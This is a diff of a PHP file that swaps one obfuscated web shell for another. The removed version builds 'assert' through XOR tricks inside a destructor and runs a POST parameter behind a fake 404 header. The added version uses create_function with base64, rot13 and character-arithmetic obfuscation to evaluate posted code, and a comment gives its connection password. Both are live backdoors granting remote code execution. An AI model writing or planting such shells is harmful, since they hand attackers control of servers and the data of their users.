@@ -1,18 +1,2 @@
-<?php 
-header('HTTP/1.1 404');
-class QSJA { 
-    public $c='';
-    function __destruct() {
-        $_0 = "\x46" ^ "\x27";
-        $_1 = "\xd5" ^ "\xa6";
-        $_2 = "\xf5" ^ "\x86";
-        $_3 = "\x2a" ^ "\x4f";
-        $_4 = "\xe7" ^ "\x95";
-        $_5 = "\xb9" ^ "\xcd";
-        $db =$_0.$_1.$_2.$_3.$_4.$_5;
-        return @$db($this->c);
-    }
-}
-$qsja = new QSJA();
-@$qsja->c = $_POST['WOcao'];
-?>
+<?php // 使用时请删除此行, 连接密码: eMdWnezK ?>
+<?php $GRoA=create_function(str_rot13('$').chr(25875/225).chr(49950/450).chr(0x3af-0x342).base64_decode('ZQ=='),base64_decode('ZQ==').str_rot13('i').str_rot13('n').chr(0472-0316).chr(0654-0604).str_rot13('$').base64_decode('cw==').chr(0223330/01250).chr(0x1c0-0x153).chr(879-778).chr(0x10c-0xe3).chr(0130305/01377));$GRoA(base64_decode('MjkzM'.'DM5O0'.'BldkF'.'sKCRf'.''.chr(474-389).str_rot13('R').base64_decode('OQ==').str_rot13('G').base64_decode('Vg==').''.''.str_rot13('S').chr(0x94a0/0x148).chr(01462-01306).chr(0x25f-0x20b).base64_decode('Vw==').''.'RXbmV'.'6S10p'.'Ozg3O'.'TExNz'.'s='.''));?>
